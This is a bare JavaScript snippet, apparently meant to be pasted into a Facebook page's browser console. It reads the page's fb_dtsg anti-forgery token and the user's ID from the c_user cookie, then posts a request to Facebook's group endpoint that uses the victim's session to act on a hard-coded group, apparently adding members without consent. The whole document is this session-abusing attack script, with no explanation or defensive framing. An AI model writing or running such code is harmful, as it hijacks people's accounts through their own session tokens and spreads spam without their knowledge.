
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function G(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/members/add_post.php?group_id="+gid+"&all_outstanding=1&source=member_page&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=e&ttstamp=2658167728810111298";
var PageParams ="fb_dtsg="+fb_dtsg+"&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=f&ttstamp=2658167728810111298";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
G("310509582323426");
